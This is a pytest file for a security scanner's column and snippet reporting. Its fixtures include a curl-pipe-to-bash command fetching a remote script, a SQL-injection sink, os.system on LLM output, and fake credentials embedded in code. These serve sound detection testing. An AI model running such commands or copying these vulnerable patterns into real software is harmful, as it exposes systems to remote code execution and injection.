"""Location columns and indented snippets for the line and AST scanners.

Columns are 1-based, counted in characters, with ``end_column`` just past the
last character (SARIF). Snippets keep the source indentation.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from nephilex.core.config import Config
from nephilex.core.plugin import ScannerContext, registry
from nephilex.core.project import Project


def _scan(tmp_path: Path, scanner: str, files: dict[str, str], analyze: bool = False) -> list:
    for name, body in files.items():
        p = tmp_path / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(body, encoding="utf-8")
    project = Project.from_path(tmp_path)
    if analyze:
        from nephilex.analysis.repository import RepositoryAnalyzer

        RepositoryAnalyzer().analyze(project)
    ctx = ScannerContext(project=project, config=Config(), ai=None)
    return list(registry.get_scanner(scanner)().scan(ctx))


def _span(line: str, finding) -> str:
    loc = finding.location
    return line[loc.start_column - 1 : loc.end_column - 1]


def test_lang_sast_columns_and_indentation(tmp_path):
    line = "        ObjectInputStream in = new ObjectInputStream(stream);"
    findings = _scan(tmp_path, "lang-sast", {"A.java": "class A {\n" + line + "\n}\n"})
    hit = next(f for f in findings if f.rule_id == "lang.java.deser")
    loc = hit.location
    assert (loc.start_line, loc.end_line) == (2, 2)
    assert loc.start_column == line.index("ObjectInputStream(") + 1
    assert _span(line, hit) == "ObjectInputStream("
    assert loc.snippet == line


def test_lang_sast_columns_on_a_windowed_long_line(tmp_path):
    # Past the scan window, so the match is found in a later window of the line.
    line = "x" * 5000 + " ObjectInputStream("
    findings = _scan(tmp_path, "lang-sast", {"A.java": line + "\n"})
    hit = next(f for f in findings if f.rule_id == "lang.java.deser")
    assert _span(line, hit) == "ObjectInputStream("


def test_malware_columns_and_indentation(tmp_path):
    line = "    curl -fsSL https://dl.invalid/i.sh | bash"
    findings = _scan(
        tmp_path, "malware", {"install.sh": "#!/bin/sh\nif true; then\n" + line + "\nfi\n"}
    )
    assert findings
    hit = findings[0]
    assert hit.location.start_line == 3
    assert hit.location.snippet == line
    assert hit.location.start_column == 5
    assert _span(line, hit).startswith("curl ")
    assert _span(line, hit).endswith("bash")


def test_secrets_columns_point_at_the_secret_and_snippet_stays_redacted(tmp_path):
    key = "AKIA" + "ABCDEFGHIJKLMNOP"
    line = f'    aws_key = "{key}"'
    findings = _scan(tmp_path, "secrets", {"cfg.py": "def f():\n" + line + "\n"})
    hit = next(f for f in findings if f.rule_id == "secrets.aws-access-key-id")
    loc = hit.location
    assert (loc.start_line, loc.end_line) == (2, 2)
    assert _span(line, hit) == key
    assert loc.snippet is not None
    assert key not in loc.snippet
    assert loc.snippet.startswith('    aws_key = "')


def test_ast_js_columns_come_from_the_node(tmp_path):
    pytest.importorskip("tree_sitter")
    pytest.importorskip("tree_sitter_javascript")
    pytest.importorskip("tree_sitter_typescript")
    # The non-ASCII comment checks that columns count characters, not bytes.
    sink = "db.query('SELECT * FROM u WHERE n=' + req.query.user)"
    line = "  /*é*/ " + sink + ";"
    code = "app.get('/u',(req,res)=>{\n" + line + "\n});\n"
    findings = _scan(tmp_path, "ast-js", {"app.js": code}, analyze=True)
    hit = next(f for f in findings if "CWE-89" in f.cwe)
    loc = hit.location
    assert (loc.start_line, loc.end_line) == (2, 2)
    assert loc.start_column == 9
    assert _span(line, hit) == sink
    assert loc.snippet == line


def test_llm_ast_columns_and_indented_snippet(tmp_path):
    pytest.importorskip("tree_sitter_python")
    pytest.importorskip("tree_sitter_javascript")
    pytest.importorskip("tree_sitter_typescript")
    code = (
        "from openai import OpenAI\n"
        "client = OpenAI()\n"
        "def f(q):\n"
        "    out = client.chat.completions.create(model='m', messages=q)"
        ".choices[0].message.content\n"
        "    import os\n"
        "    os.system(out)\n"
    )
    findings = _scan(tmp_path, "llm", {"app.py": code}, analyze=True)
    hit = next(f for f in findings if f.rule_id == "llm.insecure-output-handling")
    loc = hit.location
    assert (loc.start_line, loc.end_line) == (6, 6)
    assert (loc.start_column, loc.end_column) == (5, 19)
    assert loc.snippet == "    os.system(out)"


def test_llm_prompt_leak_columns_point_into_the_literal(tmp_path):
    pytest.importorskip("tree_sitter_python")
    pytest.importorskip("tree_sitter_javascript")
    pytest.importorskip("tree_sitter_typescript")
    secret_line = "    'You are support. The admin password: Sup3rS3cret99. '"
    url_line = "    'Billing lives at http://billing.internal/api.'"
    code = (
        "import openai\n"
        "SYSTEM_PROMPT = (\n"
        f"{secret_line}\n"
        f"{url_line}\n"
        ")\n"
        "def msgs(q):\n"
        "    return [{'role': 'system', 'content': SYSTEM_PROMPT}, {'role': 'user', 'content': q}]\n"
    )
    findings = _scan(tmp_path, "llm", {"app.py": code}, analyze=True)
    secret = next(f for f in findings if f.rule_id == "llm.secret-in-system-prompt")
    url = next(f for f in findings if f.rule_id == "llm.internal-url-in-system-prompt")
    assert secret.location.start_line == 3
    # The prose-secret value class includes ".", so the span ends after it.
    assert _span(secret_line, secret) == "Sup3rS3cret99."
    assert secret.location.snippet is not None
    assert secret.location.snippet.startswith("    'You are support.")
    assert "Sup3rS3cret99" not in secret.location.snippet
    assert url.location.start_line == 4
    assert _span(url_line, url) == "http://billing.internal"
    assert url.location.snippet == url_line
